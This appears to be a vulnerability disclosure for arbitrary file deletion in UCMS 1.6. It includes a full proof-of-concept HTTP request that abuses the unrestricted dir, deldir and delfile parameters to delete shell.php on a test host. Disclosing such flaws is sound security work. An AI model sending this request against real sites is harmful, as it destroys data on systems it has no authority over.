## Arbitrary file deletion vulnerability exists in UCMS 1.6

vendor: http://uuu.la/

Download link for UCMS-1.6 installation package: http://uuu.la/uploadfile/file/ucms_1.6.zip

At present, there is a shell.php file in the directory of our website.

![image](https://user-images.githubusercontent.com/54017627/161382570-9bf1a492-9e80-4f2d-affe-bc3e61cf3a10.png)

We send a request packet for file deletion，We can see how the dir parameter and deldir parameter are not limited.

```sql
GET /ucms_1.6/ucms/index.php?do=sadmin_file&uuu_token=8945ab62&dir=/&deldir=/&delfile=shell.php HTTP/1.1
Host: 192.168.1.101
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.101/ucms_1.6/ucms/index.php?do=sadmin_file&dir=/ucms_1.6/uploadfile
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: admin_adc3f8=admin; psw_adc3f8=97376f13bb0b37ffdc31255d275d609c; token_adc3f8=8945ab62
Connection: close
```

Let's go to the root directory of the website and find that the shell.php file has been deleted successfully.

![image](https://user-images.githubusercontent.com/54017627/161382676-5945c0cd-c444-420b-a2d8-d9dfe4497343.png)
